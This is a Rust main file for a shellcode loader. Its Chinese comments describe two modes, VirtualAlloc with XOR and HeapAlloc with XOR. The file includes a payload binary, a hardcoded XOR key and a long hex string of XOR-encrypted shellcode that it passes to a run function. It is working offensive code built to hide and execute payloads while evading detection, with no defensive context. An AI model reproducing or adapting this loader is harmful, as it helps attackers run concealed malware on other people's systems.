mod toolbox;
mod encryption;
mod solution;
mod loader;
use crate::solution::plana::plana_create;
use crate::solution::plana::plana_run;
use crate::solution::planb::planb_create;
use crate::solution::planb::planb_run;

fn main() {
    let key = "GjYFUYUFD3425df798GCKnx";                               //用于异或的key
    let shellcode = include_bytes!("..\\payload_x64_0712.bin");     //用于生成密文的shellcode

    // step1:执行create生成密文
    // step2 执行run生成二进制文件

    // plana winapi_virtualalloc + xor
    // plana_create(key,shellcode);
    // let xor_encrypted_random_string="6247626a325932466455615961553246614435336234313239356464346636373439343833473343374b356e36783347376a345933463455335934553646364436336634373230353764366639373139323865473243364b666e33783147356a305961463155315963556446304437333434313231356464636664373139363831473343374b636e62783947346a375933463455325965553346384438336534373232353064646630376539373861476143374b336e30783747366a615961466655355937556146334434333234353235353764366661373639343837473243664b356e66786247336a385932463555365937556646364464336234643235353164356630373239313861473243364b666e33783147356a345961466455325930553446364439333134313235353464396636373239323862473243344b636e32786147336a655936463655315933553446354462333234623238356364666634373339343862473643654b336e30786347326a615961463255645932553146314464333534383238353564316636376339663837476243324b636e37783647626a655932463455345936553746654433333834653238356164346631373539303833473943314b626e31783047366a655931463655645963556546314464333534383238353364306662373739353866476143374b636e30783347666a355963463855325937556646364466333034333235353064366634373239383861473543364b396e38783347326a395962463155355934553546314439333734643235356464306633373739643865473243344b316e65786147366a645932463055655964553746374431336434373231353464366639373339323864473243664b666e33783447626a325932463155645963556446314435333434353231356364346637373939343837473243624b666e33783647626a645932466355365937556546374437333834363230353064366631376239313835473343374b326e32783047366a335932463155385931556646314434333034333231356464636635376139383831473343374b356e36783047636a615938463455335965553746364436333034363232353064666663373839353839473843374b336e37786247386a395935466155365931556246334466333534393231356364666638373339333835476143354b616e35786247356a625930463155315932553346374437333834363265353064656663376139613864473243324b666e31786247366a325962466555335930556146324432333734663235353264626639373939313837476243304b356e66786247376a645935463555625934553746614430333834663238353064616637373239383832473243664b326e38783047366a335961463155385966556346364466333034663232356364656631376239623865473643644b666e34783147366a665932466355655966556646364437333834383230353664376661376639343862473643654b336e35783747366a615933463155385931553746314434333034383233356664346635373039353836473243374b356e38783847366a325965466455665939556646314463333634653264356164636631376139313830473243364b666e31783847366a325932463655385939553446314463336434303238356464306662373739353866476143364b366e35786147336a355936463655325936556246334436336234363261353064366666373939613830473343624b356e36783747636a395935463855635930556546644463333934663231356464636635373839373836473343354b656e33783847366a615932466355655966556346364437333134623231353964646630376139383863476143654b386e37786247386a395935466155365930556246364434333934303230353764316634373039353838473943314b396e33783447326a645931466655395939556546324462336334663238353464386663373639643836473643664b376e38783447376a325932466155365938553946354461336434643264353964346637373439343833473343644b666e65783147646a635938463055365937553346374433333934643230356564356662376339623834473943314b356e37783147356a315961463355615934553646374438336234623238356264316638376239613863473443624b626e36783647626a355962463455345964553546364466333434663266356564326635376639303837473343364b316e36786347326a375933466555375961553946364432336534343237356464646637376139373861476243344b346e36786547666a645963463455625935556246304430333534653236353364616634373239303865473443394b666e31783847636a615963463855375930556546354462333934363232356664386638373939373839473743384b346e62783247316a335930466355655964556646364439336334363239353564336665373439643831473543394b386e66786547616a645961463355365965553246664437333334643237356164646662376439313833473343374b356e35783147356a365930463155315936553446334430333334313238353664646636376339363831473643334b376e32783147326a315939463355635933553446374438333134383233353264326633373239613834473743304b656e31783247376a385930466255315963553546654435333534353234353264366636376339373865473443304b346e38783647376a345932463055655932556646334462333334643233356164336631373339373831473343374b616e36783647316a355935463255345938553046364431333034313238353064366633373339333862473043324b316e64783147306a305966463355625930556446334463333234643237356164376633373739373830473443314b616e30783147306a335934463455345965553746634437333134363263353064616630376639363837473443654b316e34783247656a305931463355635936553646314432333334633233353664326664373239623831476143334b396e33783847336a355932466255665964556446624434336434643237353864356662373639333863473743354b386e36786447306a335939466355375935553546384461333034343237356464396633376239643830476443644b616e32783447346a375932463755645963553646654430336234613263356564646664373539333836476143654b316e33783747386a395961463055305964553846664434336234363264356564346662373539353830473043314b356e39786447306a325965466655625964553146364431333934663266356164336664373439333865473043324b306e37786647626a665930466555385964553146304432333634343266356564316664376439303865473643324b636e62786447396a615933466655315930553746344435333234303234353664386664373339613864473543364b636e38786347386a385961466355375939553846644430333334373266356664336662373039663832476143314b386e61786447326a625965466655345966553246664464333734393239356564636639376539353830473943354b396e33783947306a325934466155625961553046614437333734353235353164666630373939373835473043664b376e31786547316a395964466255385963553946664435333434653266356464396665376439363862473443394b356e61786447656a625931463555355937556146654461336234643238353464386663376139393861473143654b666e37783847636a665961463755615962556146614461333634313230353964646661376539363836473443634b666e37783647396a345930463055615963556146624465333434313263353564666662376239333839476343664b626e63783047386a635934463555375932553346394436333434323231356164306636373839653866476243364b396e39786147656a635937463055365966556246334434333134343232353964646632376539373862473643304b376e65786247666a345936463055385939556346344466333034383263353964356661373739623830476243324b346e37783047316a315963463255655964553646304462333934663230356464356631373839613838473043384b306e38783547396a335937463655365936553746364438333734633238356664326665373139313864473943314b616e64783047666a355962463955305966556346354435333534393231353564346636373039353838476243334b346e32783247336a355936463455325937553846654437333934333238353464376634373339303861476443344b326e30786547336a335939466255635962553946384430333134313263353664316635373139373837476243624b646e64783547376a645965466455395937553746664462333034653232353064366666376239343862473443654b376e38783447376a325933466455305962556646314434336534333234353764646630376339643864473143634b626e65783747376a645965463755615932553146374462336334663238353364336666373539323864476543354b376e66783047666a365962463955615963553346394435333234633238353264316665373139633836476243374b636e33783747336a355936463455365936553346374436333934663262356164666664376339623836473943314b386e37783747366a355962463655655936553846364430333634393237356264376637373739333830476243314b616e30783347306a6359354633553659365530466444653337343532303566643666";
    // plana_run(key,xor_encrypted_random_string);


    // planb heapapi_healdlloc + xor
    // planb_create(key,shellcode);
    let xor_encrypted_random_string="6247626a325932466455615961553246614435336234313239356464346636373439343833473343374b356e36783347376a345933463455335934553646364436336634373230353764366639373139323865473243364b666e33783147356a305961463155315963556446304437333434313231356464636664373139363831473343374b636e62783947346a375933463455325965553346384438336534373232353064646630376539373861476143374b336e30783747366a615961466655355937556146334434333234353235353764366661373639343837473243664b356e66786247336a385932463555365937556646364464336234643235353164356630373239313861473243364b666e33783147356a345961466455325930553446364439333134313235353464396636373239323862473243344b636e32786147336a655936463655315933553446354462333234623238356364666634373339343862473643654b336e30786347326a615961463255645932553146314464333534383238353564316636376339663837476243324b636e37783647626a655932463455345936553746654433333834653238356164346631373539303833473943314b626e31783047366a655931463655645963556546314464333534383238353364306662373739353866476143374b636e30783347666a355963463855325937556646364466333034333235353064366634373239383861473543364b396e38783347326a395962463155355934553546314439333734643235356464306633373739643865473243344b316e65786147366a645932463055655964553746374431336434373231353464366639373339323864473243664b666e33783447626a325932463155645963556446314435333434353231356364346637373939343837473243624b666e33783647626a645932466355365937556546374437333834363230353064366631376239313835473343374b326e32783047366a335932463155385931556646314434333034333231356464636635376139383831473343374b356e36783047636a615938463455335965553746364436333034363232353064666663373839353839473843374b336e37786247386a395935466155365931556246334466333534393231356364666638373339333835476143354b616e35786247356a625930463155315932553346374437333834363265353064656663376139613864473243324b666e31786247366a325962466555335930556146324432333734663235353264626639373939313837476243304b356e66786247376a645935463555625934553746614430333834663238353064616637373239383832473243664b326e38783047366a335961463155385966556346364466333034663232356364656631376239623865473643644b666e34783147366a665932466355655966556646364437333834383230353664376661376639343862473643654b336e35783747366a615933463155385931553746314434333034383233356664346635373039353836473243374b356e38783847366a325965466455665939556646314463333634653264356164636631376139313830473243364b666e31783847366a325932463655385939553446314463336434303238356464306662373739353866476143364b366e35786147336a355936463655325936556246334436336234363261353064366666373939613830473343624b356e36783747636a395935463855635930556546644463333934663231356464636635373839373836473343354b656e33783847366a615932466355655966556346364437333134623231353964646630376139383863476143654b386e37786247386a395935466155365930556246364434333934303230353764316634373039353838473943314b396e33783447326a645931466655395939556546324462336334663238353464386663373639643836473643664b376e38783447376a325932466155365938553946354461336434643264353964346637373439343833473343644b666e65783147646a635938463055365937553346374433333934643230356564356662376339623834473943314b356e37783147356a315961463355615934553646374438336234623238356264316638376239613863473443624b626e36783647626a355962463455345964553546364466333434663266356564326635376639303837473343364b316e36786347326a375933466555375961553946364432336534343237356464646637376139373861476243344b346e36786547666a645963463455625935556246304430333534653236353364616634373239303865473443394b666e31783847636a615963463855375930556546354462333934363232356664386638373939373839473743384b346e62783247316a335930466355655964556646364439336334363239353564336665373439643831473543394b386e66786547616a645961463355365965553246664437333334643237356164646662376439313833473343374b356e35783147356a365930463155315936553446334430333334313238353664646636376339363831473643334b376e32783147326a315939463355635933553446374438333134383233353264326633373239613834473743304b656e31783247376a385930466255315963553546654435333534353234353264366636376339373865473443304b346e38783647376a345932463055655932556646334462333334643233356164336631373339373831473343374b616e36783647316a355935463255345938553046364431333034313238353064366633373339333862473043324b316e64783147306a305966463355625930556446334463333234643237356164376633373739373830473443314b616e30783147306a335934463455345965553746634437333134363263353064616630376639363837473443654b316e34783247656a305931463355635936553646314432333334633233353664326664373239623831476143334b396e33783847336a355932466255665964556446624434336434643237353864356662373639333863473743354b386e36786447306a335939466355375935553546384461333034343237356464396633376239643830476443644b616e32783447346a375932463755645963553646654430336234613263356564646664373539333836476143654b316e33783747386a395961463055305964553846664434336234363264356564346662373539353830473043314b356e39786447306a325965466655625964553146364431333934663266356164336664373439333865473043324b306e37786647626a665930466555385964553146304432333634343266356564316664376439303865473643324b636e62786447396a615933466655315930553746344435333234303234353664386664373339613864473543364b636e38786347386a385961466355375939553846644430333334373266356664336662373039663832476143314b386e61786447326a625965466655345966553246664464333734393239356564636639376539353830473943354b396e33783947306a325934466155625961553046614437333734353235353164666630373939373835473043664b376e31786547316a395964466255385963553946664435333434653266356464396665376439363862473443394b356e61786447656a625931463555355937556146654461336234643238353464386663376139393861473143654b666e37783847636a665961463755615962556146614461333634313230353964646661376539363836473443634b666e37783647396a345930463055615963556146624465333434313263353564666662376239333839476343664b626e63783047386a635934463555375932553346394436333434323231356164306636373839653866476243364b396e39786147656a635937463055365966556246334434333134343232353964646632376539373862473643304b376e65786247666a345936463055385939556346344466333034383263353964356661373739623830476243324b346e37783047316a315963463255655964553646304462333934663230356464356631373839613838473043384b306e38783547396a335937463655365936553746364438333734633238356664326665373139313864473943314b616e64783047666a355962463955305966556346354435333534393231353564346636373039353838476243334b346e32783247336a355936463455325937553846654437333934333238353464376634373339303861476443344b326e30786547336a335939466255635962553946384430333134313263353664316635373139373837476243624b646e64783547376a645965466455395937553746664462333034653232353064366666376239343862473443654b376e38783447376a325933466455305962556646314434336534333234353764646630376339643864473143634b626e65783747376a645965463755615932553146374462336334663238353364336666373539323864476543354b376e66783047666a365962463955615963553346394435333234633238353264316665373139633836476243374b636e33783747336a355936463455365936553346374436333934663262356164666664376339623836473943314b386e37783747366a355962463655655936553846364430333634393237356264376637373739333830476243314b616e30783347306a6359354633553659365530466444653337343532303566643666";
    planb_run(key,xor_encrypted_random_string);
}
